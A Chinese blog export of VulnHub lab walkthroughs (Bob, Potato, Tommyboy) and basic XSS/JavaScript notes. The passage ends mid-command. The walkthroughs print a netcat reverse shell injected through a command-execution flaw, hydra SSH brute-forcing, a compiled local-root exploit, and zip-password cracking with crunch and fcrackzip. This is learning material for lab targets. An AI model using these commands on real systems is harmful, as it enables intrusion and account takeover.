title="什么是robots.txt"></a>什么是robots.txt</h2><p>robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p><ul><li>不要访问某个文件、文件夹</li><li>禁止某些爬虫的访问</li><li>限制爬虫访问网站的频率</li></ul><p>一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。</p></blockquote><p>发现dev-shell目录中存在命令执行漏洞 既使用 <strong>管道符|</strong> 来执行nc相关命令<br>在kali上执行<code>nc -lnvp 1234 //指定1234端口开始监听</code><br><img src="7.jpg" alt="7"><br>运用命令行输入<code>w|nc -e /bin/sh [kali的ip] [指定端口]</code></p><blockquote><p><img src="1.png" alt="1"><br><img src="2.png" alt="2"></p></blockquote><p>随后反弹shell成功<br>首先 反弹到的shell页面不是很易懂 我们可以使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>来创建一个伪终端 方便后面的操作</p><blockquote><p><img src="8.jpg" alt="8"></p></blockquote><p>根据该作者在vulnhub上的提示 flag文件位于**&#x2F;<strong>目录<br>但权限不够 我们需要提权<br>先根据我们对该靶机的推测 在&#x2F;home&#x2F;bob中寻找线索<br>发现了一个</strong>.old_passwordfile.html**<br><img src="9.jpg" alt="9"><br>查看后是<strong>两对密码和账号</strong><br>我们通过ssh链接来分别测试这些账号密码<br><img src="10.jpg" alt="10"><br>很好 jc账号的密码正确 链接了靶机<br><img src="11.jpg" alt="11"><br>再次在&#x2F;home&#x2F;bob下寻找线索 发现&#x2F;Documents下有一个名为<strong>secret</strong>的文件夹和一个经过gpg加密的文件<strong>login.txt</strong> 需要密码<br>我们使用<code>ls -alR // -R 递归显示所有子文件夹和其中的文件</code>查看<br><img src="13.jpg" alt="13"><br>有一个<strong>notes.sh</strong>文件 我们查看其中的内容<br><img src="14.jpg" alt="14"><br>前言不搭后语的 但第一个字母都着重大写了 并且是一个单词 我们把它当作藏头诗理解 尝试解密先前的gpg文件<br><img src="16.jpg" alt="16"><br><code>gpg --output [输出文件名] --decrypt [需要解密的文件名]</code><br><img src="15.jpg" alt="15"><br>输入密码<strong>HARPOCRATES</strong>(你可别说这页面还挺炫)<br><img src="16.jpg" alt="16"><br>解密出来又是一套账号密码<br>再次登录 发现这次的账号有<strong>sudo</strong>权限<br>那很方便了 利用sudo查看该flag文件<br><img src="17.jpg" alt="17"><br>结束！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>较为简短的靶机 结合了gpg加密与命令执行漏洞的知识<br>学无止境 期待下次的靶机</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>potato解析</title>
      <link href="/2023/12/10/potato%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/12/10/potato%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：potato（192.168.246.137）</p><h2 id="使用工具-指令"><a href="#使用工具-指令" class="headerlink" title="使用工具&amp;指令:"></a>使用工具&amp;指令:</h2><p>nmap （端口扫描）<br>hydra （服务端密码爆破）<br>sreachsploit （漏洞检索）<br>ssh （远程登录服务）<br>find （寻找文件）<br>scp （linux之间远程传输文件）</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>国际惯例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l //发现同网段设备</span><br><span class="line">nmap -A -p- “ip地址” //扫描指定ip开放的端口 并套用默认脚本</span><br></pre></td></tr></table></figure><p><img src="1.jpg" alt="1"><br>扫描发现该ip开放了80端口与7120端口 其中7120端口对应ssh服务<br>我们使用firefox访问该ip<br><img src="2.jpg" alt="2"><br>没有发现什么特殊的东西 f12也没有隐藏注释<br>只能将我们的注意转到ssh服务中<br>但ssh需要<strong>账号与密码</strong> 而我们目前没有<br>按照该靶机名称与网页中的土豆图片 我们推测账户名为<strong>potato</strong> 进行一次密码爆破来测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hydra -l “账号名” -P “密码字典文件” -V -t 4 服务://ip地址：端口</span><br><span class="line">// 密码字典位于/usr/share/wordlists/rockyou.txt.gz 中 请自行解压</span><br><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz #-d 将压缩文件解压</span><br><span class="line">// -V 显示具体过程</span><br><span class="line">// -t 1-64 决定线程 数字越大爆破速度越快 但占用更大</span><br></pre></td></tr></table></figure><p><img src="3.jpg" alt="3"><br><img src="4.jpg" alt="4"><br>结果出来了 账号 <strong>potato</strong> 的密码为 <strong>letmein</strong><br>我们赶紧来登录一下吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 用户名@ip地址 -p 端口 //由于该端口不是默认的22 所以需要额外注释</span><br></pre></td></tr></table></figure><p><img src="5.jpg" alt="5"><br>进入后发现&#x2F;root文件夹中有我们想要的文件 但当前权限不够<br>于是需要<strong>提权</strong><br>我们使用<strong>sreachsploit</strong> 来搜索<strong>该版本ubuntu的提权漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sreachsploit “搜索关键词”</span><br></pre></td></tr></table></figure><p><img src="6.jpg" alt="6"><br>有了 文件名是<strong>37292.c</strong><br>不知道该文件在哪里 我们<strong>使用find命令</strong>寻找该文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find [路径] [匹配条件]</span><br><span class="line">参数说明:</span><br><span class="line">路径 是要查找的目录路径，可以是一个目录或文件名，也可以是多个路径，多个路径之间用空格分隔，如果未指定路径，则默认为当前目录。</span><br><span class="line">expression 是可选参数，用于指定查找的条件，可以是文件名、文件类型、文件大小等等。</span><br><span class="line">匹配条件 中可使用的选项有二三十个之多，以下列出最常用的部份：</span><br><span class="line">-name pattern：按文件名查找，支持使用通配符 \* 和 ?。</span><br><span class="line">-type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。</span><br><span class="line">-size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。</span><br><span class="line">-mtime days：按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。</span><br><span class="line">-user username：按文件所有者查找。</span><br><span class="line">-group groupname：按文件所属组查找。</span><br></pre></td></tr></table></figure><p>随后<strong>使用scp命令</strong>将文件传输到靶机中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp [可选参数] [文件源] [传输目标]</span><br><span class="line">// -p 指定端口</span><br><span class="line">// 传输目标格式为 用户名@ip:/目标文件夹</span><br></pre></td></tr></table></figure><p><img src="7.jpg" alt="7"><br>随后执行提权漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exp //对刚刚下载的提权脚本进行编译</span><br><span class="line">chmod +x exp //给提权脚本赋予执行权限</span><br><span class="line">./exp //运行提权脚本，运行后即可提权至root</span><br></pre></td></tr></table></figure><p><img src="8.jpg" alt="8"><br><strong>阅读&#x2F;root下的&#x2F;proof.txt</strong><br>明显是一串<strong>md5加密</strong>后的产物 我们拿去解密网站解密 获得flag<br><img src="9.jpg" alt="9"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>比较小体量的靶机 主要集中在一些标准的<strong>密码爆破</strong> <strong>漏洞提权</strong> 过程中<br>那么我们下次见！</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss跨站点脚本攻击</title>
      <link href="/2023/12/05/xss%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
      <url>/2023/12/05/xss%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>总之这是今天的笔记</p><h2 id="什么是xss跨站点脚本攻击"><a href="#什么是xss跨站点脚本攻击" class="headerlink" title="什么是xss跨站点脚本攻击"></a>什么是xss跨站点脚本攻击</h2><p>XSS的原理和分类<br>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p><p>1.什么是Javascript<br>JavaScript是指在网页上编写的脚本语言，是对HTML在功能上的扩展。<br>JavaScript与Java没有任何关系，它们只是名字相似而已。<br>JavaScript的代码嵌入在HTML里，直接在客户端的浏览器上执行，属于前端语言。<br>大多数的XSS代码都是使用JavaScript语言编写的，JavaScript能做到什么效果，XSS的威力就有多大。<br>JavaScript自测<br><a href="https://www.w3school.com.cn/quiz/quiz.asp?quiz=js">https://www.w3school.com.cn/quiz/quiz.asp?quiz=js</a><br>JavaScript基础语法练习<br>搭建环境（WS2008+AppServ+Sublime）<br>例子1：JavaScript test</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;JavaScript test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;&lt;h1&gt;Hello,world&quot;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子2：JavaScript 变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;JavaScript 变量&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var name = &quot;shuke&quot;;</span><br><span class="line">document.write(&quot;&lt;h1&gt;hello,&quot;+ name)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子3：JavaScript 字符串拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;字符串拼接&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var name = &quot;leiyu&quot;;</span><br><span class="line">var age = 17;</span><br><span class="line">document.write(&quot;&lt;h1&gt;Hello,everyone! My name is &quot; + name +&quot;. I&#x27;m &quot; + age +&quot; years old.&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子4：JavaScript 事件响应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;JavaScript 事件响应&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;请单击此处&quot; onclick=alert(&#x27;你单击了此按钮，触发了弹窗&#x27;) &gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子5：JavaScript OnError事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;JavaScript OnError事件&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=alert(&quot;客官，您久等了....&quot;)&gt;</span><br><span class="line">&lt;img src=&quot;./images/welcome.png&quot; onerror=alert(&quot;请检查图片路径....&quot;)&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">加载外部js文件</span><br><span class="line">jstest.html文件</span><br><span class="line">&lt;script src=&quot;/js/test.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">test.js文件</span><br><span class="line">alert(&quot;hello,world!&quot;);</span><br></pre></td></tr></table></figure><p>例子6:加载外部文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=“URL&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;加载外部js文件&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;./js/test.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子7:加载外部文件document对象的常用属性:cookie,location</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;document对象的常用属性:cookie,location&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(document.cookie);</span><br><span class="line">alert(document.location);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子8:location.href实现页面跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;location.href实现页面跳转&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(document.location);</span><br><span class="line">location=&quot;http://www.51cto.com&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子9:Javascript语法-条件判断+函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Javascript语法-条件判断+函数&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function getGrade(score)&#123;</span><br><span class="line">if (score&gt;=60)&#123;</span><br><span class="line">return &quot;及格&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">return &quot;不及格&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(getGrade(40));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子10：条件分支</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;根据分数给出等第&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function getGrade(score)</span><br><span class="line">&#123;</span><br><span class="line">if(score&gt;=90)</span><br><span class="line">&#123;</span><br><span class="line">return &quot;excellent&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else if(score&gt;=80)</span><br><span class="line">&#123;</span><br><span class="line">return &quot;good&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else if(score&gt;=70)&#123;</span><br><span class="line">return &quot;just so so&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else if(score&gt;=60)&#123;</span><br><span class="line">return &quot;pass&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else if&#123;</span><br><span class="line">return &quot;not good&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(getGrade(70));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每周靶机之Tommyboy1dot0</title>
      <link href="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/"/>
      <url>/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/</url>
      
        <content type="html"><![CDATA[<p>总之这是今天的靶机</p><h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><p>攻击机：kali（192.168.246.128）<br>• <strong>工具：</strong><br>nmap（端口扫描）<br>dirbuster（目录爆破）<br>crunch（密码表生成）<br>fcrackzip （压缩包爆破）<br>wpscan （扫描&#x2F;爆破wordpress）</p><p>• <strong>知识点：</strong><br>1、信息泄露<br>2、md5解密<br>3、命令执行</p><h1 id="获取过程"><a href="#获取过程" class="headerlink" title="获取过程"></a>获取过程</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img src="1.jpg" alt="1"><br>国际惯例 先arp-scan 发现同网段的设备<br><img src="2.jpg" alt="2"><br><img src="6.jpg" alt="6"></p><blockquote><p><strong>-sC ：根据端口识别的服务，调用默认脚本 。</strong></p></blockquote><p>我们借用nmap的-sC附加项 发现80端口存在四个<strong>防止爬虫进入的目录</strong></p><blockquote><h2 id="什么是robots-txt"><a href="#什么是robots-txt" class="headerlink" title="什么是robots.txt"></a>什么是robots.txt</h2><p>robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p><ul><li>不要访问某个文件、文件夹</li><li>禁止某些爬虫的访问</li><li>限制爬虫访问网站的频率</li></ul><p>一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。</p></blockquote><p>依次进入 发现flag-numero-uno.txt目录下存在第一个flag信息<br><img src="7.jpg" alt="7"><br>按他的描述 <strong>存在五个flag碎片</strong> 我们需要集齐它们来获取最终的宝藏</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>firefox访问80端口<br><img src="3.jpg" alt="3"><br>f12发现隐藏注释<br><img src="4.jpg" alt="4"><br>翻译大意为<strong>线索在这段youtube视频之中</strong><br><img src="5.jpg" alt="5"><br>访问查看 全文就一句 <strong>“hey prehistoricforest”</strong><br>我们尝试 **&#x2F;prehistoricforest&#x2F;**目录<br>访问发现是个公司博客<br>我们查看其中的文章与评论获取线索<br><img src="8.jpg" alt="8"><br>发现了flag2的线索：thisisthesecondflagyayyou.txt<br>往目录中输入查看<br><img src="9.jpg" alt="9"><br>成功获取第二个flag</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><img src="10.jpg" alt="10"><br>博客的前两篇相互关联<br>一篇是加密的 无法访问<br>而另一篇则是在询问该加密博客的密码<br>我们查看该博客来寻找线索<br><img src="11.jpg" alt="11"><br>提示提到我们要删去目录中的 <strong>prehistoricforest</strong> 换上 <strong>richard</strong><br><img src="12.jpg" alt="12"><br>发现了一张图片 我们保存下来<br><img src="13.jpg" alt="13"><br>使用<strong>strings</strong>工具查看是否存在图片隐写<br><img src="14.jpg" alt="14"><br>可以看出其中潜藏了一段md5码<br><img src="15.jpg" alt="15"><br>解密结果为<strong>spanky</strong><br>看来spanky就是加密博客的密码<br>我们输入 访问<br><img src="16.jpg" alt="16"><br>博客大致翻译如上<br>那么我们知道了<br>1.ftp服务器不咋稳定 每15分钟会开机关机循环<br>2.ftp有个名为<strong>nickburns</strong>的账户 密码很好猜<br>3.ftp在一个不寻常的端口上运行<br>我们ftp尝试链接<br><img src="17.jpg" alt="17"><br>ps：这里省略了等待+nmap扫描端口后发现65534的过程<br>总之我们发现了一个名为readme.txt的文件<br>获取后开启<br><img src="18.jpg" alt="18"><br>内容大意如下<br>按照他的意思 我们访问NickIzL33t目录<br><img src="19.jpg" alt="19"><br>网站说只有他和史蒂夫乔布斯(苹果公司创始人)可以看到其中的内容<br>那看来是需要以iphone的身份来进入<br><img src="20.jpg" alt="20"><br>我们去firefox的插件商城下个更改身份的插件(关键词<strong>User Agent Switcher</strong>)<br>安装完更改身份 刷新网页<br><img src="21.jpg" alt="21"><br>他说我通过了第一个考验 但真正的内容需要我输入准确的.html目录<br>那就使用目录爆破工具<strong>dirbuster</strong>来扫描<br><img src="22.jpg" alt="22"><br>ps:需要在<strong>options-advance options</strong>中将<strong>user agent(请求头)<strong>改为iphone 把</strong>file extension</strong>改为html<br>线程能拉多大拉多大 是为了加速出结果</p><blockquote><p>示意图:</p><p><img src="24.png" alt="24"></p><p>待解决的问题：dirbuster报错20次会自动停止需要手动继续开始 目前没有找到解决方法</p></blockquote><p><img src="23.jpg" alt="23"><br>得到结果fallon1.html 我们访问<br><img src="24.jpg" alt="24"><br>获得 <strong>一个提示 flag3与pw备份</strong><br><img src="25.jpg" alt="25"></p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p><strong>pw备份</strong>是个压缩包 我们暂且保存下来<br>发现需要密码<br>那我们看看提示有没有提供什么有用的</p><p><img src="26.jpg" alt="26"><br>他告诉了我们密码的组成成分 而我们可以<strong>利用这点生成一个密码表</strong><br>通过搜索了解Tommy Boy上映于1995年<br>也就是说 密码为<code>bev[一个大写字符][两个数字][两个小写字符][一个符号]1995</code> 一共十三个字符<br>我们利用<strong>crunch</strong>工具生成密码表</p><blockquote><p>crunch使用指南</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</span><br><span class="line">-t 指定密码输出的格式</span><br><span class="line">-o 将密码保存到指定文件</span><br><span class="line">特殊字符，通常与-t配合使用</span><br><span class="line">% 代表数字</span><br><span class="line">^ 代表特殊符号</span><br><span class="line">@ 代表小写字符</span><br><span class="line">, 代表大写字符</span><br></pre></td></tr></table></figure></blockquote><p>这里按我们所需要的密码来输入命令</p><p><code>crunch 13 13 -t bev,%%@@^1995 -o password.txt</code><br><img src="27.jpg" alt="27"><br>生成完毕了<br>我们再利用<strong>fcrackzip</strong>工具来爆破压缩包</p><p><img src="28.jpg" alt="28"><br>先安装一下</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -v -D -u -p [密码文件] 